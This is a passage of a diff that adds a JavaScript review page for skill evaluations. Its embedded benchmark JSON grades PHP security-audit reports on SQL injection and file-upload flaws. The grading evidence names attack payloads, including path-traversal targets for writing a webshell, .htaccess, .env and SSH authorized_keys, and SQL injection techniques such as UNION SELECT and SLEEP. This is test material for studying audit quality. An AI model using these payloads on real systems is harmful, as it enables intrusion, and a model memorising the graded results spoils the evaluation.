\u5b50\u53e5\u4e2d\u7684\u5b57\u6bb5\u540d\u4e0d\u80fd\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\uff08\u9884\u5904\u7406\u4ec5\u652f\u6301\u503c\u7ed1\u5b9a\uff0c\u4e0d\u652f\u6301\u6807\u8bc6\u7b26\u7ed1\u5b9a\uff09\u3002\u56e0\u6b64\u5373\u4f7f\u7528\u4e86 PDO \u9884\u5904\u7406\uff0c$sortField \u4f9d\u7136\u9700\u8981\u767d\u540d\u5355\u6821\u9a8c\u3002'"}, {"text": "\u62a5\u544a\u5305\u542b\u5177\u4f53\u7684 SQL \u6ce8\u5165\u653b\u51fb payload \u793a\u4f8b", "passed": true, "evidence": "\u5229\u7528\u573a\u666f\u5305\u542b: UNION SELECT payload\u3001\u5e03\u5c14\u76f2\u6ce8 SUBSTRING \u793a\u4f8b\u3001\u65f6\u95f4\u76f2\u6ce8 SLEEP payload\u3001CASE WHEN \u5e03\u5c14\u76f2\u6ce8\uff08ORDER BY \u4e0a\u4e0b\u6587\uff09"}, {"text": "\u62a5\u544a\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u7ed9\u51fa\u4e86\u5177\u4f53\u7684\u4fee\u590d\u4ee3\u7801\uff08\u4e0d\u4ec5\u662f\u5efa\u8bae\uff09", "passed": true, "evidence": "\u6bcf\u4e2a\u6f0f\u6d1e\u90fd\u6709\u5b8c\u6574\u4fee\u590d\u4ee3\u7801: (int)\u7c7b\u578b\u8f6c\u6362\u4ee3\u7801\u3001PDO bind_param \u4ee3\u7801\u3001\u767d\u540d\u5355 in_array \u6821\u9a8c\u4ee3\u7801"}], "notes": []}, {"eval_id": 3, "configuration": "with_skill", "run_number": 1, "result": {"pass_rate": 1.0, "passed": 4, "failed": 0, "total": 4, "time_seconds": 42.0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b filename \u4ece $_POST \u5230 file_put_contents \u7684\u5b8c\u6574 Source-to-Sink \u4f20\u64ad\u94fe\u8def", "passed": true, "evidence": "\u4f20\u64ad\u94fe\u8def\u5b8c\u6574\u5217\u51fa: $_POST['filename'] \u2192 UploadController.php:57 \u2192 UploadController.php:61 (\u8de8\u6587\u4ef6) \u2192 FileService.php:43 \u2192 FileService.php:47 ($exportDir\u62fc\u63a5) \u2192 FileService.php:50 (dirname) \u2192 FileService.php:52 (mkdir) \u2192 FileService.php:56 (file_put_contents)\uff0c\u6bcf\u6b65\u6807\u6ce8\u6587\u4ef6:\u884c\u53f7"}, {"text": "\u62a5\u544a\u6307\u51fa MIME \u7c7b\u578b\u68c0\u67e5\u4ec5\u4f9d\u8d56\u5ba2\u6237\u7aef $file['type']\uff08\u53ef\u4f2a\u9020\uff09", "passed": true, "evidence": "\u660e\u786e\u5199\u6709'$file['type'] = \u5ba2\u6237\u7aef Content-Type \u5934 \u2192 \u53ef\u4f2a\u9020'\uff0c\u5e76\u8bf4\u660e'\u653b\u51fb\u8005\u76f4\u63a5\u7528 Burp \u4fee\u6539 Content-Type \u4e3a image/png'"}, {"text": "\u62a5\u544a\u5305\u542b\u8def\u5f84\u7a7f\u8d8a\u7684\u5177\u4f53\u5229\u7528 payload\uff08\u5982 ../../config/database.php\uff09", "passed": true, "evidence": "\u5229\u7528\u573a\u666f\u5305\u542b4\u4e2a\u5177\u4f53 payload: ../../webroot/shell.php\uff08\u5199webshell\uff09\u3001../../.env\uff08\u8986\u5199\u914d\u7f6e\uff09\u3001../.htaccess\uff08\u542f\u7528PHP\u6267\u884c\uff09\u3001../../../root/.ssh/authorized_keys\uff08SSH\u5199\u5165\uff09"}, {"text": "\u62a5\u544a\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684\u4fee\u590d\u4ee3\u7801\u793a\u4f8b", "passed": true, "evidence": "\u6bcf\u4e2a\u6f0f\u6d1e\u90fd\u6709\u5b8c\u6574\u4fee\u590d\u4ee3\u7801: basename() + bin2hex\u968f\u673a\u5316 + realpath()\u6821\u9a8c\u7684\u5b8c\u6574\u65b9\u6cd5\u3001finfo\u68c0\u6d4b\u771f\u5b9eMIME + getimagesize()\u9a8c\u8bc1 + \u968f\u673a\u5316\u6587\u4ef6\u540d\u7684\u5b8c\u6574\u65b9\u6cd5"}], "notes": []}, {"eval_id": 2, "configuration": "without_skill", "run_number": 1, "result": {"pass_rate": 0.0, "passed": 0, "failed": 3, "total": 3, "time_seconds": 12.0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u89e3\u91ca\u4e86 addslashes + GBK \u5bbd\u5b57\u8282\u6ce8\u5165\u7684\u539f\u7406\uff08\u542b %df%5c \u5b57\u8282\u5e8f\u5217\u5206\u6790\uff09", "passed": false, "evidence": "\u4ec5\u63d0\u5230'addslashes() \u5728 GBK \u7f16\u7801\u4e0b\u4e0d\u53ef\u9760'\uff0c\u65e0\u5b57\u8282\u5e8f\u5217\u5206\u6790\uff0c\u65e0\u539f\u7406\u89e3\u91ca"}, {"text": "\u62a5\u544a\u6307\u51fa buildRedirectUrl \u4e2d // \u534f\u8bae\u76f8\u5bf9 URL \u53ef\u7ed5\u8fc7 strpos(http://) \u68c0\u67e5", "passed": false, "evidence": "\u4ec5\u8bf4'\u53ef\u4ee5\u7528 // \u534f\u8bae\u76f8\u5bf9URL\u7ed5\u8fc7'\uff0c\u672a\u89e3\u91ca\u4e3a\u4ec0\u4e48\u80fd\u7ed5\u8fc7 strpos \u68c0\u67e5\uff0c\u672a\u8bf4\u660e\u6d4f\u89c8\u5668\u7684\u534f\u8bae\u76f8\u5bf9 URL \u89e3\u6790\u884c\u4e3a"}, {"text": "\u62a5\u544a\u6307\u51fa ssoVerify \u4e2d token/state \u672a URL \u7f16\u7801\u5bfc\u81f4\u67e5\u8be2\u53c2\u6570\u6ce8\u5165", "passed": false, "evidence": "\u4ec5\u8bf4'\u76f4\u63a5\u62fc\u63a5\u5230 URL\uff0c\u672a\u505a URL \u7f16\u7801'\uff0c\u672a\u5206\u6790\u8fd9\u4f1a\u5bfc\u81f4\u4ec0\u4e48\u5b89\u5168\u95ee\u9898\uff08\u53c2\u6570\u622a\u65ad\u3001\u53c2\u6570\u8986\u76d6\uff09"}], "notes": []}, {"eval_id": 1, "configuration": "without_skill", "run_number": 1, "result": {"pass_rate": 0.0, "passed": 0, "failed": 4, "total": 4, "time_seconds": 15.0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b $_GET['order_id'] \u4ece Controller \u7ecf Service \u5230 Repository \u7684\u5b8c\u6574\u8de8\u6587\u4ef6\u4f20\u64ad\u94fe\u8def", "passed": false, "evidence": "\u4ec5\u63d0\u5230'OrderController.php:32 \u2192 OrderRepository.php:21'\uff0c\u7f3a\u5c11\u8de8\u6587\u4ef6 Service \u5c42\u7684\u4f20\u64ad\u7ec6\u8282\uff0c\u6ca1\u6709\u9010\u884c\u7684\u94fe\u8def\u8ffd\u8e2a\uff0c\u6ca1\u6709\u6807\u6ce8\u6bcf\u4e2a\u8282\u70b9\u7684\u6587\u4ef6\u540d\u548c\u884c\u53f7"}, {"text": "\u62a5\u544a\u660e\u786e\u6307\u51fa $sortField \u5728 ORDER BY \u4e2d\u65e0\u6cd5\u901a\u8fc7\u53c2\u6570\u5316\u67e5\u8be2\u9632\u62a4\uff0c\u9700\u8981\u767d\u540d\u5355", "passed": false, "evidence": "\u4ec5\u8bf4'\u4f7f\u7528\u5b57\u6bb5\u540d\u767d\u540d\u5355'\uff0c\u672a\u89e3\u91ca\u4e3a\u4ec0\u4e48\u53c2\u6570\u5316\u67e5\u8be2\u5bf9 ORDER BY \u65e0\u6548\uff0c\u7f3a\u5c11\u4e0a\u4e0b\u6587\u5206\u6790"}, {"text": "\u62a5\u544a\u5305\u542b\u5177\u4f53\u7684 SQL \u6ce8\u5165\u653b\u51fb payload \u793a\u4f8b", "passed": false, "evidence": "\u62a5\u544a\u4e2d\u65e0\u4efb\u4f55\u653b\u51fb payload \u793a\u4f8b"}, {"text": "\u62a5\u544a\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u7ed9\u51fa\u4e86\u5177\u4f53\u7684\u4fee\u590d\u4ee3\u7801\uff08\u4e0d\u4ec5\u662f\u5efa\u8bae\uff09", "passed": false, "evidence": "\u53ea\u6709\u4e00\u53e5\u8bdd\u5efa\u8bae\u5982'\u4f7f\u7528 (int)$_GET['order_id']'\uff0c\u65e0\u5b8c\u6574\u4ee3\u7801\u793a\u4f8b"}], "notes": []}, {"eval_id": 3, "configuration": "without_skill", "run_number": 1, "result": {"pass_rate": 0.0, "passed": 0, "failed": 4, "total": 4, "time_seconds": 12.0, "tokens": 0, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "\u62a5\u544a\u5305\u542b filename \u4ece $_POST \u5230 file_put_contents \u7684\u5b8c\u6574 Source-to-Sink \u4f20\u64ad\u94fe\u8def", "passed": false, "evidence": "\u4ec5\u8bf4'$filename \u76f4\u63a5\u62fc\u63a5\u5230\u8def\u5f84\u4e2d'\uff0c\u65e0\u9010\u884c\u8ffd\u8e2a\uff0c\u65e0\u4e2d\u95f4\u8282\u70b9\u5206\u6790\uff0c\u65e0\u8de8\u6587\u4ef6\u4f20\u9012\u8bb0\u5f55"}, {"text": "\u62a5\u544a\u6307\u51fa MIME \u7c7b\u578b\u68c0\u67e5\u4ec5\u4f9d\u8d56\u5ba2\u6237\u7aef $file['type']\uff08\u53ef\u4f2a\u9020\uff09", "passed": false, "evidence": "\u4ec5\u8bf4'MIME \u7c7b\u578b\u4ec5\u68c0\u67e5 $file[\"type\"]\uff08\u5ba2\u6237\u7aef\u53ef\u63a7\uff0c\u53ef\u4f2a\u9020\uff09'\uff0c\u672a\u89e3\u91ca $file['type'] \u4e3a\u4ec0\u4e48\u6765\u81ea\u5ba2\u6237\u7aef\u3001\u5982\u4f55\u4f2a\u9020"}, {"text": "\u62a5\u544a\u5305\u542b\u8def\u5f84\u7a7f\u8d8a\u7684\u5177\u4f53\u5229\u7528 payload\uff08\u5982 ../../config/database.php\uff09", "passed": false, "evidence": "\u4ec5\u63d0\u5230'../../config/database.php'\u4f5c\u4e3a\u793a\u4f8b\uff0c\u65e0\u5b8c\u6574\u7684\u5229\u7528\u573a\u666f\u8bf4\u660e"}, {"text": "\u62a5\u544a\u5bf9\u6bcf\u4e2a\u6f0f\u6d1e\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684\u4fee\u590d\u4ee3\u7801\u793a\u4f8b", "passed": false, "evidence": "\u4ec5\u6709\u4e00\u53e5\u8bdd\u5efa\u8bae\u5982'\u4f7f\u7528 basename($filename)'\u6216'\u4f7f\u7528 finfo \u68c0\u6d4b\u771f\u5b9e MIME \u7c7b\u578b'\uff0c\u65e0\u5b8c\u6574\u4ee3\u7801"}], "notes": []}], "run_summary": {"with_skill": {"pass_rate": {"mean": 1.0, "stddev": 0.0, "min": 1.0, "max": 1.0}, "time_seconds": {"mean": 42.3333, "stddev": 2.5166, "min": 40.0, "max": 45.0}, "tokens": {"mean": 0.0, "stddev": 0.0, "min": 0, "max": 0}}, "without_skill": {"pass_rate": {"mean": 0.0, "stddev": 0.0, "min": 0.0, "max": 0.0}, "time_seconds": {"mean": 13.0, "stddev": 1.7321, "min": 12.0, "max": 15.0}, "tokens": {"mean": 0.0, "stddev": 0.0, "min": 0, "max": 0}}, "delta": {"pass_rate": "+1.00", "time_seconds": "+29.3", "tokens": "+0"}}, "notes": []}};
+
+    // ---- State ----
+    let feedbackMap = {};  // run_id -> feedback text
+    let currentIndex = 0;
+    let visitedRuns = new Set();
+
+    // ---- Init ----
+    async function init() {
+      // Load saved feedback from server — but only if this isn't a fresh
+      // iteration (indicated by previous_feedback being present). When
+      // previous feedback exists, the feedback.json on disk is stale from
+      // the prior iteration and should not pre-fill the textareas.
+      const hasPrevious = Object.keys(EMBEDDED_DATA.previous_feedback || {}).length > 0
+        || Object.keys(EMBEDDED_DATA.previous_outputs || {}).length > 0;
+      if (!hasPrevious) {
+        try {
+          const resp = await fetch("/api/feedback");
+          const data = await resp.json();
+          if (data.reviews) {
+            for (const r of data.reviews) feedbackMap[r.run_id] = r.feedback;
+          }
+        } catch { /* first run, no feedback yet */ }
+      }
+
+      document.getElementById("skill-name").textContent = EMBEDDED_DATA.skill_name;
+      showRun(0);
+
+      // Wire up feedback auto-save
+      const textarea = document.getElementById("feedback");
+      let saveTimeout = null;
+      textarea.addEventListener("input", () => {
+        clearTimeout(saveTimeout);
+        document.getElementById("feedback-status").textContent = "";
+        saveTimeout = setTimeout(() => saveCurrentFeedback(), 800);
+      });
+    }
+
+    // ---- Navigation ----
+    function navigate(delta) {
+      const newIndex = currentIndex + delta;
+      if (newIndex >= 0 && newIndex < EMBEDDED_DATA.runs.length) {
+        saveCurrentFeedback();
+        showRun(newIndex);
+      }
+    }
+
+    function updateNavButtons() {
+      document.getElementById("prev-btn").disabled = currentIndex === 0;
+      document.getElementById("next-btn").disabled =
+        currentIndex === EMBEDDED_DATA.runs.length - 1;
+    }
+
+    // ---- Show a run ----
+    function showRun(index) {
+      currentIndex = index;
+      const run = EMBEDDED_DATA.runs[index];
+
+      // Progress
+      document.getElementById("progress").textContent =
+        `${index + 1} of ${EMBEDDED_DATA.runs.length}`;
+
+      // Prompt
+      document.getElementById("prompt-text").textContent = run.prompt;
+
+      // Config badge
+      const badge = document.getElementById("config-badge");
+      const configMatch = run.id.match(/(with_skill|without_skill|new_skill|old_skill)/);
+      if (configMatch) {
+        const config = configMatch[1];
+        const isBaseline = config === "without_skill" || config === "old_skill";
+        badge.textContent = config.replace(/_/g, " ");
+        badge.className = "config-badge " + (isBaseline ? "config-baseline" : "config-primary");
+        badge.style.display = "inline-block";
+      } else {
+        badge.style.display = "none";
+      }
+
+      // Outputs
+      renderOutputs(run);
+
+      // Previous outputs
+      renderPrevOutputs(run);
+
+      // Grades
+      renderGrades(run);
+
+      // Previous feedback
+      const prevFb = (EMBEDDED_DATA.previous_feedback || {})[run.id];
+      const prevEl = document.getElementById("prev-feedback");
+      if (prevFb) {
+        document.getElementById("prev-feedback-text").textContent = prevFb;
+        prevEl.style.display = "block";
+      } else {
+        prevEl.style.display = "none";
+      }
+
+      // Feedback
+      document.getElementById("feedback").value = feedbackMap[run.id] || "";
+      document.getElementById("feedback-status").textContent = "";
+
+      updateNavButtons();
+
+      // Track visited runs and promote done button when all visited
+      visitedRuns.add(index);
+      const doneBtn = document.getElementById("done-btn");
+      if (visitedRuns.size >= EMBEDDED_DATA.runs.length) {
+        doneBtn.classList.add("ready");
+      }
+
+      // Scroll main content to top
+      document.querySelector(".main").scrollTop = 0;
+    }
+
+    // ---- Render outputs ----
+    function renderOutputs(run) {
+      const container = document.getElementById("outputs-body");
+      container.innerHTML = "";
+
+      const outputs = run.outputs || [];
+      if (outputs.length === 0) {
+        container.innerHTML = '<div class="empty-state">No output files</div>';
+        return;
+      }
+
+      for (const file of outputs) {
+        const fileDiv = document.createElement("div");
+        fileDiv.className = "output-file";
+
+        // Always show file header with download link
+        const header = document.createElement("div");
+        header.className = "output-file-header";
+        const nameSpan = document.createElement("span");
+        nameSpan.textContent = file.name;
+        header.appendChild(nameSpan);
+        const dlBtn = document.createElement("a");
+        dlBtn.className = "dl-btn";
+        dlBtn.textContent = "Download";
+        dlBtn.download = file.name;
+        dlBtn.href = getDownloadUri(file);
+        header.appendChild(dlBtn);
+        fileDiv.appendChild(header);
+
+        const content = document.createElement("div");
+        content.className = "output-file-content";
+
+        if (file.type === "text") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          content.appendChild(pre);
+        } else if (file.type === "image") {
+          const img = document.createElement("img");
+          img.src = file.data_uri;
+          img.alt = file.name;
+          content.appendChild(img);
+        } else if (file.type === "pdf") {
+          const iframe = document.createElement("iframe");
+          iframe.src = file.data_uri;
+          content.appendChild(iframe);
+        } else if (file.type === "xlsx") {
+          renderXlsx(content, file.data_b64);
+        } else if (file.type === "binary") {
+          const a = document.createElement("a");
+          a.className = "download-link";
+          a.href = file.data_uri;
+          a.download = file.name;
+          a.textContent = "Download " + file.name;
+          content.appendChild(a);
+        } else if (file.type === "error") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          pre.style.color = "var(--red)";
+          content.appendChild(pre);
+        }
+
+        fileDiv.appendChild(content);
+        container.appendChild(fileDiv);
+      }
+    }
+
+    // ---- XLSX rendering via SheetJS ----
+    function renderXlsx(container, b64Data) {
+      try {
+        const raw = Uint8Array.from(atob(b64Data), c => c.charCodeAt(0));
+        const wb = XLSX.read(raw, { type: "array" });
+
+        for (let i = 0; i < wb.SheetNames.length; i++) {
+          const sheetName = wb.SheetNames[i];
+          const ws = wb.Sheets[sheetName];
+
+          if (wb.SheetNames.length > 1) {
+            const sheetLabel = document.createElement("div");
+            sheetLabel.style.cssText =
+              "font-weight:600; font-size:0.8rem; color:#b0aea5; margin-top:0.5rem; margin-bottom:0.25rem;";
+            sheetLabel.textContent = "Sheet: " + sheetName;
+            container.appendChild(sheetLabel);
+          }
+
+          const htmlStr = XLSX.utils.sheet_to_html(ws, { editable: false });
+          const wrapper = document.createElement("div");
+          wrapper.innerHTML = htmlStr;
+          container.appendChild(wrapper);
+        }
+      } catch (err) {
+        container.textContent = "Error rendering spreadsheet: " + err.message;
+      }
+    }
+
+    // ---- Grades ----
+    function renderGrades(run) {
+      const section = document.getElementById("grades-section");
+      const content = document.getElementById("grades-content");
+
+      if (!run.grading) {
+        section.style.display = "none";
+        return;
+      }
+
+      const grading = run.grading;
+      section.style.display = "block";
+      // Reset to collapsed
+      content.classList.remove("open");
+      document.getElementById("grades-arrow").classList.remove("open");
+
+      const summary = grading.summary || {};
+      const expectations = grading.expectations || [];
+
+      let html = '<div style="padding: 1rem;">';
+
+      // Summary line
+      const passRate = summary.pass_rate != null
+        ? Math.round(summary.pass_rate * 100) + "%"
+        : "?";
+      const badgeClass = summary.pass_rate >= 0.8 ? "grade-pass" : summary.pass_rate >= 0.5 ? "" : "grade-fail";
+      html += '<div class="grades-summary">';
+      html += '<span class="grade-badge ' + badgeClass + '">' + passRate + '</span>';
+      html += '<span>' + (summary.passed || 0) + ' passed, ' + (summary.failed || 0) + ' failed of ' + (summary.total || 0) + '</span>';
+      html += '</div>';
+
+      // Assertions list
+      html += '<ul class="assertion-list">';
+      for (const exp of expectations) {
+        const statusClass = exp.passed ? "pass" : "fail";
+        const statusIcon = exp.passed ? "\u2713" : "\u2717";
+        html += '<li class="assertion-item">';
+        html += '<span class="assertion-status ' + statusClass + '">' + statusIcon + '</span>';
+        html += '<span>' + escapeHtml(exp.text) + '</span>';
+        if (exp.evidence) {
+          html += '<div class="assertion-evidence">' + escapeHtml(exp.evidence) + '</div>';
+        }
+        html += '</li>';
+      }
+      html += '</ul>';
+
+      html += '</div>';
+      content.innerHTML = html;
+    }
+
+    function toggleGrades() {
+      const content = document.getElementById("grades-content");
+      const arrow = document.getElementById("grades-arrow");
+      content.classList.toggle("open");
+      arrow.classList.toggle("open");
+    }
+
+    // ---- Previous outputs (collapsible) ----
+    function renderPrevOutputs(run) {
+      const section = document.getElementById("prev-outputs-section");
+      const content = document.getElementById("prev-outputs-content");
+      const prevOutputs = (EMBEDDED_DATA.previous_outputs || {})[run.id];
+
+      if (!prevOutputs || prevOutputs.length === 0) {
+        section.style.display = "none";
+        return;
+      }
+
+      section.style.display = "block";
+      // Reset to collapsed
+      content.classList.remove("open");
+      document.getElementById("prev-outputs-arrow").classList.remove("open");
+
+      // Render the files into the content area
+      content.innerHTML = "";
+      const wrapper = document.createElement("div");
+      wrapper.style.padding = "1rem";
+
+      for (const file of prevOutputs) {
+        const fileDiv = document.createElement("div");
+        fileDiv.className = "output-file";
+
+        const header = document.createElement("div");
+        header.className = "output-file-header";
+        const nameSpan = document.createElement("span");
+        nameSpan.textContent = file.name;
+        header.appendChild(nameSpan);
+        const dlBtn = document.createElement("a");
+        dlBtn.className = "dl-btn";
+        dlBtn.textContent = "Download";
+        dlBtn.download = file.name;
+        dlBtn.href = getDownloadUri(file);
+        header.appendChild(dlBtn);
+        fileDiv.appendChild(header);
+
+        const fc = document.createElement("div");
+        fc.className = "output-file-content";
+
+        if (file.type === "text") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          fc.appendChild(pre);
+        } else if (file.type === "image") {
+          const img = document.createElement("img");
+          img.src = file.data_uri;
+          img.alt = file.name;
+          fc.appendChild(img);
+        } else if (file.type === "pdf") {
+          const iframe = document.createElement("iframe");
+          iframe.src = file.data_uri;
+          fc.appendChild(iframe);
+        } else if (file.type === "xlsx") {
+          renderXlsx(fc, file.data_b64);
+        } else if (file.type === "binary") {
+          const a = document.createElement("a");
+          a.className = "download-link";
+          a.href = file.data_uri;
+          a.download = file.name;
+          a.textContent = "Download " + file.name;
+          fc.appendChild(a);
+        }
+
+        fileDiv.appendChild(fc);
+        wrapper.appendChild(fileDiv);
+      }
+
+      content.appendChild(wrapper);
+    }
+
+    function togglePrevOutputs() {
+      const content = document.getElementById("prev-outputs-content");
+      const arrow = document.getElementById("prev-outputs-arrow");
+      content.classList.toggle("open");
+      arrow.classList.toggle("open");
+    }
+
+    // ---- Feedback (saved to server -> feedback.json) ----
+    function saveCurrentFeedback() {
+      const run = EMBEDDED_DATA.runs[currentIndex];
+      const text = document.getElementById("feedback").value;
+
+      if (text.trim() === "") {
+        delete feedbackMap[run.id];
+      } else {
+        feedbackMap[run.id] = text;
+      }
+
+      // Build reviews array from map
+      const reviews = [];
+      for (const [run_id, feedback] of Object.entries(feedbackMap)) {
+        if (feedback.trim()) {
+          reviews.push({ run_id, feedback, timestamp: new Date().toISOString() });
+        }
+      }
+
+      fetch("/api/feedback", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ reviews, status: "in_progress" }),
+      }).then(() => {
+        document.getElementById("feedback-status").textContent = "Saved";
+      }).catch(() => {
+        // Static mode or server unavailable — no-op on auto-save,
+        // feedback will be downloaded on final submit
+        document.getElementById("feedback-status").textContent = "Will download on submit";
+      });
+    }
+
+    // ---- Done ----
+    function showDoneDialog() {
+      // Save current textarea to feedbackMap (but don't POST yet)
+      const run = EMBEDDED_DATA.runs[currentIndex];
+      const text = document.getElementById("feedback").value;
+      if (text.trim() === "") {
+        delete feedbackMap[run.id];
+      } else {
+        feedbackMap[run.id] = text;
+      }
+
+      // POST once with status: complete — include ALL runs so the model
+      // can distinguish "no feedback" (looks good) from "not reviewed"
+      const reviews = [];
+      const ts = new Date().toISOString();
+      for (const r of EMBEDDED_DATA.runs) {
+        reviews.push({ run_id: r.id, feedback: feedbackMap[r.id] || "", timestamp: ts });
+      }
+      const payload = JSON.stringify({ reviews, status: "complete" }, null, 2);
+      fetch("/api/feedback", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: payload,
+      }).then(() => {
+        document.getElementById("done-overlay").classList.add("visible");
+      }).catch(() => {
+        // Server not available (static mode) — download as file
+        const blob = new Blob([payload], { type: "application/json" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "feedback.json";
+        a.click();
+        URL.revokeObjectURL(url);
+        document.getElementById("done-overlay").classList.add("visible");
+      });
+    }
+
+    function closeDoneDialog() {
+      // Reset status back to in_progress
+      saveCurrentFeedback();
+      document.getElementById("done-overlay").classList.remove("visible");
+    }
+
+    // ---- Toast ----
+    function showToast(message) {
+      const toast = document.getElementById("toast");
+      toast.textContent = message;
+      toast.classList.add("visible");
+      setTimeout(() => toast.classList.remove("visible"), 2000);
+    }
+
+    // ---- Keyboard nav ----
+    document.addEventListener("keydown", (e) => {
+      // Don't capture when typing in textarea
+      if (e.target.tagName === "TEXTAREA") return;
+
+      if (e.key === "ArrowLeft" || e.key === "ArrowUp") {
+        e.preventDefault();
+        navigate(-1);
+      } else if (e.key === "ArrowRight" || e.key === "ArrowDown") {
+        e.preventDefault();
+        navigate(1);
+      }
+    });
+
+    // ---- Util ----
+    function getDownloadUri(file) {
+      if (file.data_uri) return file.data_uri;
+      if (file.data_b64) return "data:application/octet-stream;base64," + file.data_b64;
+      if (file.type === "text") return "data:text/plain;charset=utf-8," + encodeURIComponent(file.content);
+      return "#";
+    }
+
+    function escapeHtml(text) {
+      const div = document.createElement("div");
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    // ---- View switching ----
+    function switchView(view) {
+      document.querySelectorAll(".view-tab").forEach(t => t.classList.remove("active"));
+      document.querySelectorAll(".view-panel").forEach(p => p.classList.remove("active"));
+      document.querySelector(`[onclick="switchView('${view}')"]`).classList.add("active");
+      document.getElementById("panel-" + view).classList.add("active");
+    }
+
+    // ---- Benchmark rendering ----
+    function renderBenchmark() {
+      const data = EMBEDDED_DATA.benchmark;
+      if (!data) return;
+
+      // Show the tabs
+      document.getElementById("view-tabs").style.display = "flex";
+
+      const container = document.getElementById("benchmark-content");
+      const summary = data.run_summary || {};
+      const metadata = data.metadata || {};
+      const notes = data.notes || [];
+
+      let html = "";
+
+      // Header
+      html += "<h2 style='font-family: Poppins, sans-serif; margin-bottom: 0.5rem;'>Benchmark Results</h2>";
+      html += "<p style='color: var(--text-muted); font-size: 0.875rem; margin-bottom: 1.25rem;'>";
+      if (metadata.skill_name) html += "<strong>" + escapeHtml(metadata.skill_name) + "</strong> &mdash; ";
+      if (metadata.timestamp) html += metadata.timestamp + " &mdash; ";
+      if (metadata.evals_run) html += "Evals: " + metadata.evals_run.join(", ") + " &mdash; ";
+      html += (metadata.runs_per_configuration || "?") + " runs per configuration";
+      html += "</p>";
+
+      // Summary table
+      html += '<table class="benchmark-table">';
+
+      function fmtStat(stat, pct) {
+        if (!stat) return "—";
+        const suffix = pct ? "%" : "";
+        const m = pct ? (stat.mean * 100).toFixed(0) : stat.mean.toFixed(1);
+        const s = pct ? (stat.stddev * 100).toFixed(0) : stat.stddev.toFixed(1);
+        return m + suffix + " ± " + s + suffix;
+      }
+
+      function deltaClass(val) {
+        if (!val) return "";
+        const n = parseFloat(val);
+        if (n > 0) return "benchmark-delta-positive";
+        if (n < 0) return "benchmark-delta-negative";
+        return "";
+      }
+
+      // Discover config names dynamically (everything except "delta")
+      const configs = Object.keys(summary).filter(k => k !== "delta");
+      const configA = configs[0] || "config_a";
+      const configB = configs[1] || "config_b";
+      const labelA = configA.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+      const labelB = configB.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+      const a = summary[configA] || {};
+      const b = summary[configB] || {};
+      const delta = summary.delta || {};
+
+      html += "<thead><tr><th>Metric</th><th>" + escapeHtml(labelA) + "</th><th>" + escapeHtml(labelB) + "</th><th>Delta</th></tr></thead>";
+      html += "<tbody>";
+
+      html += "<tr><td><strong>Pass Rate</strong></td>";
+      html += "<td>" + fmtStat(a.pass_rate, true) + "</td>";
+      html += "<td>" + fmtStat(b.pass_rate, true) + "</td>";
+      html += '<td class="' + deltaClass(delta.pass_rate) + '">' + (delta.pass_rate || "—") + "</td></tr>";
+
+      // Time (only show row if data exists)
+      if (a.time_seconds || b.time_seconds) {
+        html += "<tr><td><strong>Time (s)</strong></td>";
+        html += "<td>" + fmtStat(a.time_seconds, false) + "</td>";
+        html += "<td>" + fmtStat(b.time_seconds, false) + "</td>";
+        html += '<td class="' + deltaClass(delta.time_seconds) + '">' + (delta.time_seconds ? delta.time_seconds + "s" : "—") + "</td></tr>";
+      }
+
+      // Tokens (only show row if data exists)
+      if (a.tokens || b.tokens) {
+        html += "<tr><td><strong>Tokens</strong></td>";
+        html += "<td>" + fmtStat(a.tokens, false) + "</td>";
+        html += "<td>" + fmtStat(b.tokens, false) + "</td>";
+        html += '<td class="' + deltaClass(delta.tokens) + '">' + (delta.tokens || "—") + "</td></tr>";
+      }
+
+      html += "</tbody></table>";
+
+      // Per-eval breakdown (if runs data available)
+      const runs = data.runs || [];
+      if (runs.length > 0) {
+        const evalIds = [...new Set(runs.map(r => r.eval_id))].sort((a, b) => a - b);
+
+        html += "<h3 style='font-family: Poppins, sans-serif; margin-bottom: 0.75rem;'>Per-Eval Breakdown</h3>";
+
+        const hasTime = runs.some(r => r.result && r.result.time_seconds != null);
+        const hasErrors = runs.some(r => r.result && r.result.errors > 0);
+
+        for (const evalId of evalIds) {
+          const evalRuns = runs.filter(r => r.eval_id === evalId);
+          const evalName = evalRuns[0] && evalRuns[0].eval_name ? evalRuns[0].eval_name : "Eval " + evalId;
+
+          html += "<h4 style='font-family: Poppins, sans-serif; margin: 1rem 0 0.5rem; color: var(--text);'>" + escapeHtml(evalName) + "</h4>";
+          html += '<table class="benchmark-table">';
+          html += "<thead><tr><th>Config</th><th>Run</th><th>Pass Rate</th>";
+          if (hasTime) html += "<th>Time (s)</th>";
+          if (hasErrors) html += "<th>Crashes During Execution</th>";
+          html += "</tr></thead>";
+          html += "<tbody>";
+
+          // Group by config and render with average rows
+          const configGroups = [...new Set(evalRuns.map(r => r.configuration))];
+          for (let ci = 0; ci < configGroups.length; ci++) {
+            const config = configGroups[ci];
+            const configRuns = evalRuns.filter(r => r.configuration === config);
+            if (configRuns.length === 0) continue;
+
+            const rowClass = ci === 0 ? "benchmark-row-with" : "benchmark-row-without";
+            const configLabel = config.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+
+            for (const run of configRuns) {
+              const r = run.result || {};
+              const prClass = r.pass_rate >= 0.8 ? "benchmark-delta-positive" : r.pass_rate < 0.5 ? "benchmark-delta-negative" : "";
+              html += '<tr class="' + rowClass + '">';
